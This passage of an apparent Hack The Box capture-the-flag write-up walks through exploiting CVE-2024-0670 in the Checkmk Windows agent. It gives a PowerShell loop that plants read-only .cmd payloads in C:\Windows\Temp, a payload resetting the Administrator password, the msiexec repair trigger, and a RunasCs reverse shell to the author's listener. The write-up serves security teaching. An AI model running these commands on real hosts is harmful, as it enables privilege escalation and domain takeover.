d-----         6/15/2026   8:56 PM                uploads
-a----          4/2/2025   3:36 PM             58 .htaccess
-a----         4/11/2025  10:38 AM           2520 index.html
-a----          4/2/2025   3:49 PM           1562 success.php
-a----          4/9/2025  12:17 AM           1472 upload.php
```

And the main domain:

```console
evil-winrm-py PS C:\> ls xampp\htdocs\nanocorp

    Directory: C:\xampp\htdocs\nanocorp

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/5/2025  10:58 AM                css
d-----          4/5/2025  10:58 AM                fontawesome
d-----          4/9/2025  11:24 PM                img
d-----          4/5/2025  10:58 AM                js
d-----          4/5/2025  10:58 AM                slick
-a----          4/9/2025  11:27 PM          16212 index.html
```

There’s also a `dashboard` site, but it looks like an XAMPP dashboard.

#### Programs

In `C:\Program Files` I’ll note that Defender is installed:

```console
evil-winrm-py PS C:\Program Files> ls

    Directory: C:\Program Files

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/2/2025   6:24 PM                Common Files
d-----         11/3/2025   4:13 PM                Internet Explorer
d-----          5/8/2021   1:20 AM                ModifiableWindowsApps
d-----          4/2/2025   6:25 PM                VMware
d-----          5/8/2021   2:35 AM                Windows Defender
d-----         11/3/2025   4:13 PM                Windows Defender Advanced Threat Protection
d-----         11/3/2025   4:13 PM                Windows Mail
d-----         11/3/2025   4:13 PM                Windows Media Player
d-----          5/8/2021   2:35 AM                Windows NT
d-----         11/3/2025   4:13 PM                Windows Photo Viewer
d-----          5/8/2021   1:34 AM                WindowsPowerShell
d-----          4/2/2025   6:36 PM                WinRAR
```

Other than WinRAR, everything else looks pretty standard. `Program Files (x86)` looks similar except for one:

```console
evil-winrm-py PS C:\Program Files (x86)> ls

    Directory: C:\Program Files (x86)

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/5/2025   4:17 PM                checkmk
d-----          5/8/2021   1:34 AM                Common Files
d-----         11/3/2025   4:13 PM                Internet Explorer
d-----          5/8/2021   2:40 AM                Microsoft
d-----          5/8/2021   1:34 AM                Microsoft.NET
d-----          5/8/2021   2:35 AM                Windows Defender
d-----         11/3/2025   4:13 PM                Windows Mail
d-----         11/3/2025   4:13 PM                Windows Media Player
d-----          5/8/2021   2:35 AM                Windows NT
d-----         11/3/2025   4:13 PM                Windows Photo Viewer
d-----          5/8/2021   1:34 AM                WindowsPowerShell
```

`checkmk` is an [IT asset management tool](https://checkmk.com/). monitoring_svc can’t access it:

```console
evil-winrm-py PS C:\Program Files (x86)\checkmk> ls

    Directory: C:\Program Files (x86)\checkmk

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/5/2025   4:42 PM                service
evil-winrm-py PS C:\Program Files (x86)\checkmk> cd service
evil-winrm-py PS C:\Program Files (x86)\checkmk\service> ls
Access to the path 'C:\Program Files (x86)\checkmk\service' is denied.
```

Looking at listening ports, I’ll notice one that wasn’t on the original `nmap` scan:

```console
evil-winrm-py PS C:\> netstat -ano | findstr LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4884
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       712
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       1012
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       712
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       712
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       1012
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       712
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       712
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       712
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       928
  TCP    0.0.0.0:5986           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:6556           0.0.0.0:0              LISTENING       4020
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       3096
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       712
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       548
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1288
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1712
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       712
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       2200
  TCP    0.0.0.0:50068          0.0.0.0:0              LISTENING       712
  TCP    0.0.0.0:50073          0.0.0.0:0              LISTENING       712
  TCP    0.0.0.0:50090          0.0.0.0:0              LISTENING       692
  TCP    0.0.0.0:50096          0.0.0.0:0              LISTENING       2764
  TCP    0.0.0.0:58482          0.0.0.0:0              LISTENING       3088
  TCP    10.129.243.199:53      0.0.0.0:0              LISTENING       2764
  TCP    10.129.243.199:139     0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2764
  TCP    127.0.0.1:28250        0.0.0.0:0              LISTENING       3120
  TCP    [::]:80                [::]:0                 LISTENING       4884
  TCP    [::]:88                [::]:0                 LISTENING       712
  TCP    [::]:135               [::]:0                 LISTENING       1012
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:464               [::]:0                 LISTENING       712
  TCP    [::]:593               [::]:0                 LISTENING       1012
  TCP    [::]:3389              [::]:0                 LISTENING       928
  TCP    [::]:5986              [::]:0                 LISTENING       4
  TCP    [::]:6556              [::]:0                 LISTENING       4020
  TCP    [::]:9389              [::]:0                 LISTENING       3096
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       712
  TCP    [::]:49665             [::]:0                 LISTENING       548
  TCP    [::]:49666             [::]:0                 LISTENING       1288
  TCP    [::]:49667             [::]:0                 LISTENING       1712
  TCP    [::]:49668             [::]:0                 LISTENING       712
  TCP    [::]:49669             [::]:0                 LISTENING       2200
  TCP    [::]:50068             [::]:0                 LISTENING       712
  TCP    [::]:50073             [::]:0                 LISTENING       712
  TCP    [::]:50090             [::]:0                 LISTENING       692
  TCP    [::]:50096             [::]:0                 LISTENING       2764
  TCP    [::]:58482             [::]:0                 LISTENING       3088
  TCP    [::1]:53               [::]:0                 LISTENING       2764
```

6556 is listening from PID 4020. That’s the `cmk-agent-ctl`:

```console
evil-winrm-py PS C:\> get-process | findstr 4020
    103      11     1464       7416              4020   0 cmk-agent-ctl
```

There is also a folder in `C:\programdata`:

```console
evil-winrm-py PS C:\programdata\checkmk\agent> ls

    Directory: C:\programdata\checkmk\agent

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/5/2025   4:17 PM                backup
d-----          4/5/2025   4:17 PM                bakery
d-----         6/15/2026  12:47 PM                bin
d-----          4/5/2025   4:17 PM                config
d-----          4/5/2025   4:17 PM                install
d-----          4/5/2025   4:17 PM                local
d-----          4/5/2025   3:03 PM                log
d-----          4/5/2025   4:17 PM                modules
d-----          4/5/2025   4:17 PM                mrpe
d-----          4/5/2025   4:17 PM                plugins
d-----          4/5/2025   4:17 PM                spool
d-----          4/5/2025   4:17 PM                state
d-----          4/5/2025   4:17 PM                tmp
d-----          4/5/2025   4:17 PM                update
-a----          4/5/2025   3:03 PM             24 allow-legacy-pull
-a----          6/7/2022   9:39 AM          16906 check_mk.user.example.yml
-a----          6/7/2022   9:39 AM          16906 check_mk.user.yml
-a----         6/15/2026  12:47 PM            180 cmk-agent-ctl.toml
-a----          4/5/2025   4:17 PM             24 controller-flag
```

`cmk-agent-ctl.toml` shows the port:

```bash
# Controlled by Check_MK Agent Bakery.
# This file is managed via WATO, do not edit manually or you
# lose your changes next time when you update the agent.

pull_port = 6556
```

I can’t access `check_mk.user.yml`, but `check_mk.user.example.yml` is the exact same size:

```yml
# Copyright (C) 2019 tribe29 GmbH - License: GNU General Public License v2
# This file is part of Checkmk (https://checkmk.com). It is subject to the terms and
# conditions defined in the file COPYING, which is part of this source code package.

#
# User Check MK configuration file
#

# The Agent will accept YML-File as a valid configuration file
# only when the section global is presented

# $CUSTOM_PLUGINS_PATH$  -> is ProgramData/checkmk/agent/plugins
# $BUILTIN_PLUGINS_PATH$ -> is Program Files(x86)/checkmk/service/plugins
# $CUSTOM_AGENT_PATH$    -> is ProgramData/checkmk/agent/
# $CUSTOM_LOCAL_PATH$    -> is ProgramData/checkmk/agent/local

# 1. use http://www.yamllint.com/ for example to validate your yamllint
# 2. Windows filenames contains backslash \, ergo you have to write either "c:\\windows" or 'c:\windows'

# To disable any feature you may use two methods
# 1. commenting out with '#' recommended to use with one line declarations
# 2. renaming. Recommended to disable big parts of YAML tree
#   Most useful is adding _ at the beginning of name
#
# example
#         _logging: # <----- this structure is fully ignored by agent
#         logging:  # <----- this structure is accepted by agent

# Overriding values from the bakery( or defauts )
# For example we want to change sections set in output

# 1. All sections are included:
# sections: []  # <--- this is accepted as FULL list of sections, agent sends all data. To save your keystrokes

# 2a. Two sections:
# sections: [check_mk, systemtime]  # <--- this is accepted as list of two sections

# 2b. One section:
# sections: [plugins]  # <--- this is accepted as list of one section

# 3. We want to return back(Use values combined from default and bakery if present)
# 3a.
# sections: ~   # <--- this line is skipped, this value is estimated as undefined

# 3a.
# _sections: [plugins]   # <--- this name, '_sections' is unknown and will be ignored too

global:
    # section may be fully disabled
    # enabled: yes

    # Restrict access to certain IP addresses
    # If ipv6 is enabled, all listed ipv4 adresses are also accepted as
    # source adresses in their ipv6-mapped form. I.e. if
    # 192.168.56.0/24 is listed, connections from ::ffff:c0a8:3800/120
    # are also possible
    _only_from: # 127.0.0.1 192.168.56.0/24 ::1

    # Change port where the agent is listening ( default 6556 )
    # port: 6556

    # Disable ipv6 support. By default, ipv4 is always supported
    # and ipv6 is enabled additionally if supported by the system.
    # ipv6: no

    # encryption
    # encrypted: no

    # password
    # passphrase: secret

    # Allowed file extensions. The agent launches the program(script) only
    # when its extension is on the list of allowed ones.
    # execute: [exe, bat, vbs, cmd, ps1] # Supported: vbs, ps1, py, pl, exe, cmd, bat

    # Run sync scripts in parallel (to each other). Default is "yes"
    # async: yes

    # Just output certain sections

    # Include all possible sections:
    # sections: []

    # Valid example, but section is renamed to _sections and wil be ignored
    _sections:
        - check_mk
        - mrpe
        - skype
        - spool
        - plugins
        - local
        - winperf
        - uptime
        - systemtime
        - df
        - mem
        - services
        - msexch
        - dotnet_clrmemory
        - wmi_webservices
        - wmi_cpuload
        - ps
        - fileinfo
        - logwatch
        - openhardwaremonitor
        - agent_plugins

    # Useful example
    # sections: ~   # <--- this line is skipped as undefined
    # sections: []  # <--- this is accepted as FULL list of sections, agent send data from all sections

    # To disable section you have enumerate disabled section explicitly
    # To disable ps and fileinfo:
    _disabled_sections: [ps, fileinfo]

    # To ignore disabled_sections, you can use ~:
    # _disabled_sections: ~

    # In this case disabled_sections will be ignored too
    # disabled_sections: []

    #realtime data description
    # to control section manually change name from _realtime to realtime.
    _realtime:
        enabled: yes
        # specifies how long (in seconds) realtime updates are sent to
        # the last monitoring system that requested an update.
        # this should be longer than the request frequency (usually
        # one minute).
        # Please note that any new request cancels previous realtime
        # update schedules, so no more than one update is sent per second,
        # no matter if this timeout is "too high" or how many monitoring
        # systems are querying the agent.
        timeout: 90

        port: 6559
        # enable/disable encryption of regular agent output (default: no)
        encrypted: no

        # passphrase for encrypted communication.
        passphrase: this is my password
        # which sections are realtime, those three are by default
        run:
            - mem
            - df
            - winperf_processor

    # In seconds. Windows may be slow during WMI, increase the value when you have problems
    # wmi_timeout: 5

    # cpuload_method: 'use_perf' # set use_wmi if you have serious problems with the section

    # --------------------------------------------------------------
    # Internal log of agent
    # Write a logfile for tackling down crashes of the agent
    _logging:
        # folder with log file, empty is default which means '$CUSTOM_AGENT_PATH$\log'
        location:
        # name of file log, default is check_mk.log
        file :
        # log in file also internal debug messages, recommended when we have problems
        # allowed no, yes and all. Default yes!
        debug: yes
        # you may send logging messages in realtime in windows debug sink, default is yes
        windbg: yes

        # you may disable your eventlog ability
        eventlog: yes

        max_file_count: 5  # log rotation files quantity,  allowed 1..1024
        max_file_size: 8000000 # allowed 200K..200MB

ps:
    # enabled: yes
    # use_wmi: yes
    # full_path: yes # This value has effect only when use_wmi is set

winperf:
    # enabled: yes

    # changes only section name winperf_******
    # prefix: winperf

    # no - nothing(default), yes output trace to the log/winperf.log
    #trace: no

    # yes - separate process for winnperf to prevent ahndle leaking, no - locally
    #fork: yes

    # default value,  increase for heavy loaded machine
    # timeout: 10

    # Select counters to extract. The following counters
    # are needed by checks shipped with check_mk.
    # Format:
    # - id:name
    # where id is OS counter and name is part of CHECK_MK Header
    counters:
        #- 638: tcp_conn
        #- Terminal Services: ts_sessions

_logfiles:
    enabled: no
    # We do not support logfiles monitoring in agent at the moment
    # Please, use plugin mk_logwatch

fileinfo:
    # enabled: yes
    # below are possible examples
    path:
        # - 'c:\a\a' # generates missing| string
        # - 'c:\Users\Public\*.log' # real string to process
        # - "this\\is\\not\\recommended\\" # double quoating uses escape sequences
        # - 'c:\Users\Public\**\Desktop.ini' works, 8 files to control
        # - 'c:\Windows\Resources\**\aero\aero*.*' works too, you will get two files in 'c:\Windows\Resources\Themes\aero\'
        # - 'c:\dev\shared_public\*.*' # typical test folder, provided during development
        # - ''  # empty strings will be ignored
        # - '--' # all string without "C:\" or "\\" at start will be ignored too for security reason

logwatch:
    # enabled: yes

    # sendall: no   # this is MANDATORY, yes is useful only for debugging
    # vista_api: no # this is RECOMMENDED
    # skip_duplicated: no # if yes the same messages will be replaced with text [the above messages repeated <n> times]
    # max_size: 500000 # default value
    # max_line_length: -1 # -1 to ignore, or any positive, max length of the line
    # max_entries: -1     # -1 to ignore, or any positive, max count of lines to receive
    # timeout: -1         # -1 to ignore, or any positive, in seconds

     # entries in the windows eventlog
    logfile:
        # - 'EventLogName': <crit|warn|all|off> + [context|nocontext]
        # - 'Application': crit context # example
        # - 'System': warn nocontext    # another example
        # - 'YourOwn': all nocontext    # yet another example
        # - '*': warn nocontext         # This is default params for not missing entries

plugins:
    # enabled: yes

    # max_wait: 60 # max timeout for every sync plugin. Agen will gather plugins data no more than max_wait time.
                 # this is useful to terminate badly written or hanging plugins

    # async_start: yes # start plugins asynchronous, this is default

    # folders are scanned left -> right, order is important
    # all files from folders are gathered and verified, duplicated files will be removed
    # folders: ['$CUSTOM_PLUGINS_PATH$', '$BUILTIN_PLUGINS_PATH$' ]       # ProgramData/checkmk/agent/plugins & Program Files x86/checkmk/service/plugins

    _execution:
        # *********************************************************************************************
        # PATTERNS:
        # patterns 1. Absolute path: 'c:\Windows\*.exe' or '$CUSTOM_PLUGINS_PATH$\win_license.bat'
        #          2. Only Filename: 'mk_*.exe' or win_license.bat
        #             IMPORTANT: if you use relative path, then Agent takes only filename
        #                        'win_license.bat' and 'include\win_license.bat' are the same
        #
        # PRIORITY:
        # Most important is top-most pattern:
        # Most important is check_mk.user.yml, next check_mk.bakery.yml amd least important is check_mk.yml
        #
        # DUPLICATED Plugins:
        # Plugins with Duplicated names will not be executed:
        # if you have '$CUSTOM_PLUGINS_PATH$\winstat_an.bat' and '$BUILTIN_PLUGINS_PATH$\winstat_an.bat'
        # to execute only first one will run ^^^^^^^^^^^^^^                              xxxxxxxxxxxxxx
        #
        # *********************************************************************************************
        # execution pattern for  windows-updates.vbs:
        # all parameters below are DEFAULT set for every entry
        #- pattern     : '$CUSTOM_PLUGINS_PATH$\mk_inventory.vbs'  # Plugin name or absolute path . * and ? are allowed
        #  run         : yes                 # execute this plugin if plugin found
        #  async       : yes                 # agent will not wait for async plugins. Normally you will get data later.
        #  timeout     : 120                 # after 120 seconds process will be killed.
        #  cache_age   : 3600                # only combined with async, upto 3600 seconds we may reuse plugin output
                                             # default value is 0. Minimum positive value is 120.
        #  retry_count : 3                   # failure on start plugin, before stopping, default 0 which means never stop attempts
        #  cmd_line    : ''                  # reserved for future use
        #
        #- pattern     : '$CUSTOM_PLUGINS_PATH$\mk_scansql.vbs'    # Plugin name or absolute path . * and ? are allowed
        #  user       : 'sql_user sql_secret' # user name(domain is allowed) and password separated with one space
        #  run         : yes                 # execute this plugin if plugin found
        #
        #- pattern     : '$CUSTOM_PLUGINS_PATH$\network_access.bat'   # Plugin requires access to the Network.
        #  group       : 'Users'             # run plugin from the Internal Agent User belonging the this group
        #  run         : yes
        #
        #- pattern     : '$CUSTOM_PLUGINS_PATH$\win_license.bat'   # Plugin name. * and ? are allowed
        #  run         : No                  # do not run plugin even if found

        - pattern     : '$CUSTOM_PLUGINS_PATH$\*.*'         # in the ProgramData folder. DO NOT REMOVE THIS ENTRY
          timeout     : 30                  # after 30 seconds process will be killed. 60 sec is default in check_mk.yml
          run         : yes                 # ALL FOUND files will be started. This is default value

        - pattern     : '$BUILTIN_PLUGINS_PATH$\*.*'         # in the ProgramFiles folder. DO NOT REMOVE THIS ENTRY
          timeout     : 30                  # after 30 seconds process will be killed. 60 sec is default in check_mk.yml
          run         : no                  # No run, i.e disabled.

        - pattern     : '*'                 # This is safety entry. Try not use plugins outside your predefined folder
          run         : no                  # No run, i.e. disabked.

# ProgramData/checkmk/agent/local folder
local:
    # enabled: yes

    # max_wait: 60 # max timeout for every sync plugin. Agen will gather plugins data no more than max_wait time.
                   # this is useful to terminate badly written or hanging plugins

    # async_start: true # start plugins asynchronous, this is normal mode.

    # patterns will be scanned up down,
    # configuration is assigned to the first found file matching the pattern
    _execution:
        - pattern     : 'test_me.bat'   # Plugin name. * and ? are allowed
          #async: no                    # default is no
          timeout     : 35              # after 35 seconds process will be killed, default is 60 in check_mk.yml
          run         : yes             # execute this plugin.

        - pattern     : '*.*'           # in the user folder. DO NOT REMOVE THIS ENTRY
          run         : yes             # Do not run any files matching this pattern

mrpe:
    # enabled: yes

    # 60 is default, this is safe value, because mrpe checks are relative fast ergo
    # hitting this timeout is virtually not possible
    # timeout: 60

    # entries and cfg are the same as in the Legacy agent
    config:
        # *Relative* path are supported for checks and includes
        # Path below is equal to '$CUSTOM_AGENT_PATH$\plugins\your_check.com'
        # - check = Console 'plugins\your_check.com' CON CP /STATUS
        # - check = Console 'c:\windows\system32\mode.com' CON CP /STATUS
        # Special case with cache time and add or not cache time info to the output
        #       Description (max_age:add_info) command line
        # - check = Checker (100:yes) 'c:\windows\system32\mode.com'
        # - include user_name = $CUSTOM_AGENT_PATH$\mrpe_checks.cfg
        # - include = $CUSTOM_AGENT_PATH$\mrpe_checks.cfg

modules:
    enabled: yes

    #python: auto                          # allowed auto or system, system prevents module usage to execute *.py files

    #quick_reinstall: yes                  # use %temp% as temporary storage for modules when Windows agent is updated

system:
    enabled: yes

    #controller:
    #    run: yes        # start controller if controller presented
    #    check: yes                          # if yes that only the controller process connections could access agent monitoring data
                                             # set no if monitoring is lost and in log you find 'Connection forbidden: address'
    #    force_legacy: no                    # if yes always created for version with controller
    #    agent_channel: "localhost:28250"    # for controller
    #    local_only: no                      # bind to 127.0.0.1 or 0.0.0.0
    #    on_crash: "ignore"                  # possible values "ignore" or "emergency_mode". This is safety switch.
                                             # Use "emergency_mode" if controller crashes/disappear

    #firewall:
    #    mode: configure # allowed none, remove, configure
    #    port: auto # allowed all or auto

    #cleanup_uninstall: smart # allowed none, smart and all

    # wait_network: 30
    #
    #service:
    #    restart_on_crash: yes  # service will restart if crashed, you may set no to disable restarting
    #                           # no may be used if you have serious problems with crasghing and starting
    #    error_mode: log        # ignore or log
    #    start_mode: auto       # Possible values are: auto - service starts with boot, demand - requires manual starting
    #                           # disabled - service cannot be started manually and should be enabled
```

There’s nothing particularly interesting in this file, but the fact that it’s the same size as the running config likely suggests the default is the one that’s active.

### CVE-2024-0670 Background

Searching for “checkmk cve privesc” shows a few interesting posts:

![image-20260615201937515](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260615201937515.png)

Most of them are about [CVE-2024-0670](https://nvd.nist.gov/vuln/detail/cve-2024-0670):

> Privilege escalation in windows agent plugin in Checkmk before 2.2.0p23, 2.1.0p40 and 2.0.0 (EOL) allows local user to escalate privileges

This same text is on the [checkmk](https://checkmk.com/werk/16361) site.

[This post](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/) has more details:

> In some cases, the software creates temporary files inside the directory C:\Windows\Temp that get executed afterwards. An attacker can leverage this to place write-protected malicious files in the directory beforehand. The files get executed by Checkmk with SYSTEM privileges allowing attackers to escalate their privileges.

There’s a POC:

```powershell
10000..30000 | foreach {
	copy C:\Users\attacker\Desktop\mal.exe C:\Windows\Temp\cmk_all_${_}_1.cmd;
	Set-ItemProperty -path C:\Windows\Temp\cmk_all_${_}_1.cmd -name IsReadOnly -value $true;
}
```

Then it uses `msiexec.exe` on the checkmk installer package to trigger the execution.

### CVE-2024-0670 Fail

#### Seed Payload

I’ll start by seeding the payload. I’ll use a simple batch script that will write the current user to a file, and change the password on the Administrator account:

```console
evil-winrm-py PS C:\programdata> Set-Content -Path 0xdf.cmd -Value "@echo off`nwhoami > C:\programdata\proof.txt`nnet user Administrator 0xdf0xdf."
evil-winrm-py PS C:\programdata> cat 0xdf.cmd
@echo off
whoami > C:\programdata\proof.txt
net user Administrator 0xdf0xdf.
```

It’s important to do this using `Set-Content` or some other way that writes ASCII bytes rather than UTF-16 (as would come from `echo` in PowerShell), or this will fail later.

Now I’ll run the POC loop to create a lot of copies:

```console
evil-winrm-py PS C:\programdata> 1..10000 | foreach { copy C:\programdata\0xdf.cmd C:\Windows\Temp\cmk_all_${_}_1.cmd; Set-ItemProperty -path C:\Windows\Temp\cmk_all_${_}_1.cmd -name IsReadOnly -value $true; }
```

This spray is trying to make sure that a `cmk_all_x_1.cmd` file exists and is unchangeable for whatever PID the CheckMK worker ends up spawning as. I noted above that the `cmk-agent-ctl` was PID 4020. Looking at `Get-Process`, I’ll see that the highest PID is 7094, so it’s unlikely to spawn as something above 10000.

It takes a minute or two to run, but it eventually returns. While I can’t list inside `C:\Windows\Temp`, I can read one of the files to confirm it’s there:

```console
evil-winrm-py PS C:\programdata> type C:\Windows\Temp\cmk_all_100_1.cmd
@echo off
whoami > C:\programdata\proof.txt
net user Administrator 0xdf0xdf.
```

#### Identify Installer

There are a handful of installers in `C:\Windows\Installer`:

```console
evil-winrm-py PS C:\Windows\Installer> ls *.msi

    Directory: C:\Windows\Installer

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/28/2025   3:08 PM       12637696 1e6f2.msi
-a----         5/10/2023   9:16 AM         184320 387c2.msi
-a----         5/10/2023   9:21 AM         184320 387c6.msi
-a----         5/10/2023   9:35 AM         192512 387ca.msi
-a----         5/10/2023   9:39 AM         192512 387ce.msi
-a----          4/2/2025   6:24 PM       60895232 387d1.msi
```

`C:\Windows\Installer` is the Windows Installer cache. When any MSI package is installed, Windows stashes a copy of the `.msi` here, renamed to a random hex name like `387d1.msi`. Windows keeps these cached packages so it can later repair, modify, or uninstall the product without needing the original installer file.

I need to figure out which one of these is checkmk. I’ll check the registry, at `HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties`. With a bit of PowerShell foo, I can get each of these:

```console
evil-winrm-py PS C:\> Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" | ForEach-Object { $p = Get-ItemProperty $_.PSPath; [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage} }

Name                                                           Pkg
----                                                           ---
Microsoft Visual C++ 2022 X64 Additional Runtime - 14.36.32532 C:\Windows\Installer\387ce.msi
VMware Tools                                                   C:\Windows\Installer\387d1.msi
Microsoft Visual C++ 2022 X86 Additional Runtime - 14.36.32532 C:\Windows\Installer\387c6.msi
Check MK Agent 2.1                                             C:\Windows\Installer\1e6f2.msi
Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.36.32532    C:\Windows\Installer\387c2.msi
Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.36.32532    C:\Windows\Installer\387ca.msi
```

The one I need is `1e6f2.msi`. This also confirms the host is running the 2.1 branch of the agent, which is the branch the advisory flags as vulnerable (anything before 2.1.0p40).

#### Trigger

To trigger this, I’ll run the repair function of the installer:

```console
evil-winrm-py PS C:\> cmd /c "msiexec /fa C:\Windows\Installer\1e6f2.msi"
The Windows Installer Service could not be accessed. This can occur if the Windows Installer is not correctly installed. Contact your support personnel for assistance.
```

It’s failing, and saying it’s not installed correctly. But really, this is because the shell lacks an interactive session.

### Shell as web_svc

#### Session Enumeration

`qwinsta` would show running sessions, but it fails because I lack one:

```console
evil-winrm-py PS C:\programdata> qwinsta
No session exists for *
```

I’ll download a copy of [RunasCs](https://github.com/antonioCoco/RunasCs) and upload it to NanoCorp:

```console
evil-winrm-py PS C:\programdata> upload RunasCs.exe RunasCs.exe
Uploading /home/oxdf/hackthebox/nanocorp-10.129.243.199/RunasCs.exe: 100%|████████████████████| 50.5k/50.5k [00:00<00:00, 63.0kB/s]
[+] File uploaded successfully as: C:\programdata\RunasCs.exe
```

I’ll use this to see the sessions using a trick I’ve shown before (most recently on [HTB Mirage](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html#logged-in-user)):

```console
evil-winrm-py PS C:\programdata> .\RunasCs.exe whatever whatever qwinsta -l 9

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console                                     1  Conn
                   web_svc                   2  Disc
 rdp-tcp                                 65536  Listen
```

This says:

- Session 0 is the isolated SYSTEM / services session.
- Session 1 is connected, but no user. It’s likely at the login screen on the physical console.
- Session 2 belongs to web_svc but it’s disconnected. This suggests an RDP session was active but is now disconnected (not logged off), and the user’s token is in memory right now.

This is weird, as web_svc isn’t in the Remote Desktop Users group:

```console
evil-winrm-py PS C:\Users\monitoring_svc\Documents> net user web_svc
User name                    web_svc
Full Name                    web_svc
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/9/2025 3:59:38 PM
Password expires             Never
Password changeable          4/10/2025 3:59:38 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/17/2026 1:16:32 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *IT_Support
The command completed successfully.
```

I’ll explore this in Beyond Root.

#### Shell

I’ll use `RunasCs.exe` to get a reverse shell as web_svc:

```console
evil-winrm-py PS C:\programdata> .\RunasCs.exe web_svc 'dksehdgh712!@#' cmd.exe -r 10.10.14.51:443 -l 2

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-42cd9a2$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 7108 created in background.
```

At my listening `nc`:

```console
oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.243.199 60560
Microsoft Windows [Version 10.0.20348.3207]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nanocorp\web_svc
```

### CVE-2024-0670 Success

From a shell as web_svc (and after re-running the seed loop as there’s a cleanup job), I’ll trigger the install using the command from the blog post. This works as web_svc where it failed as monitoring_svc because web_svc has that disconnected session 2 for `msiexec` to run in, where monitoring_svc has no session at all:

```console
C:\>cmd /c "msiexec /fa C:\Windows\Installer\1e6f2.msi"
```

It doesn’t return anything, but there’s a `proof.txt` in `C:\programdata`:

```console
evil-winrm-py PS C:\programdata> cat proof.txt
nt authority\system
```

It ran as SYSTEM! And Administrator’s password is now “0xdf0xdf.”:

```console
oxdf@hacky$ netexec smb DC01.nanocorp.htb -u Administrator -p 0xdf0xdf.
SMB         10.129.243.199    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.243.199    445    DC01             [+] nanocorp.htb\Administrator:0xdf0xdf. (Pwn3d!)
```

I’ll connect over `evil-winrm-py`:

```console
oxdf@hacky$ evil-winrm-py -i DC01.nanocorp.htb -u administrator -p '0xdf0xdf.' --ssl
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'DC01.nanocorp.htb:5986' as 'administrator'
evil-winrm-py PS C:\Users\Administrator\Documents>
```

And grab `root.txt`:

```console
evil-winrm-py PS C:\Users\Administrator\Desktop> cat root.txt
f8bd26c5************************
```

## Beyond Root

### Identifying Automations

Looking at the scheduled tasks on this host as Administrator, there are several that are clearly HTB automations:

```console
evil-winrm-py PS C:\> Get-ScheduledTask

TaskPath                                       TaskName                          State
--------                                       --------                          -----
\                                              ad_cleanup                        Ready
\                                              CleaningUp                        Ready
\                                              CreateExplorerShellUnelevatedTask Ready
\                                              MicrosoftEdgeUpdateTaskMachine... Ready
\                                              MicrosoftEdgeUpdateTaskMachineUA  Ready
\                                              script01                          Ready
\                                              script02                          Ready
\                                              StartApacheAsWebSvc               Ready
\Microsoft\Windows\                            Server Initial Configuration Task Disabled
\Microsoft\Windows\.NET Framework\             .NET Framework NGEN v4.0.30319    Ready
\Microsoft\Windows\.NET Framework\             .NET Framework NGEN v4.0.30319 64 Ready
\Microsoft\Windows\.NET Framework\             .NET Framework NGEN v4.0.30319... Disabled
\Microsoft\Windows\.NET Framework\             .NET Framework NGEN v4.0.30319... Disabled
\Microsoft\Windows\Active Directory Rights ... AD RMS Rights Policy Template ... Disabled
\Microsoft\Windows\Active Directory Rights ... AD RMS Rights Policy Template ... Ready
